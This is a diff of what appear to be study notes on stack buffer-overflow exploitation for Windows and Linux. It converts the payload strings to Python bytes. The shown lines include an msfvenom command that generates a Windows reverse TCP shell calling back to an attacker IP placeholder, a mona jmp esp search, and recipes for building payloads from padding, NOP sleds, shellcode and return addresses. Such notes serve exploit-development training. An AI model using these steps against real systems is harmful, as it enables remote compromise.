@@ -16,13 +16,13 @@
 	2.!mona jmp -r esp -m module
 #6. Generate shellcode with msfvenome
       msfvenom -p windows/x86/shell_reverse_tcp LHOST=OUR_IP LPORT=443 -f python -b "BAD_CHARS_HERE"
-#7. Construct payload
-      junk = "\x41" * offset
-      jmp_esp = PUT YOUR JUMP ESP ADDR HERE  (in little endian)
-      nop = "\x90" * 16
-      shellcode = PUT YOUR SHELL CODE here
+#7. Construct payload and send
+      junk = b"\x41" * offset
+      jmp_esp = b"PUT YOUR JUMP ESP ADDR HERE"  (in little endian)
+      nop = b"\x90" * 16
+      shellcode = PUT YOUR SHELL CODE here     #the shellcode should alread have b""
       payload = junk + jump_esp + nop + shellcode 
-      payload += "\r\n"   #this is for Windows    
+      payload += b"\r\n"   #this is for Windows 
 ****************************************************** WINDOWS ***************************************************
 
 
@@ -35,10 +35,10 @@
          our NOP code so that it "slides down" to our shellcode
          Check picture for better understanding
       3. Constructing the String
-	  junk = "\x41" * (offset - len(nop) - len(shellcode) - len(ret))
-  	  nop = "\x90" * 20
-          shellcode = "\x44" * 150  #placeholder for shellcode
-          ret = "\x42"*4            #placeholder for return address
+	  junk = b"\x41" * (offset - len(nop) - len(shellcode) - len(ret))
+  	  nop = b"\x90" * 20
+          shellcode = b"\x44" * 150  #placeholder for shellcode
+          ret = b"\x42"*4            #placeholder for return address
 	  payload = junk + nop + shellcode + ret
       4. Send the payload and locate the mem addr of the nop
       5. Replace the ret with the nop addr (in little endian)
@@ -48,4 +48,5 @@
       8. Send
 ***************************************************** Linux *****************************************************
 
-
+####### do not use .encode() function in python to encode your string, it can messed up the identification of
+####### bad characters as well as running the shellcode
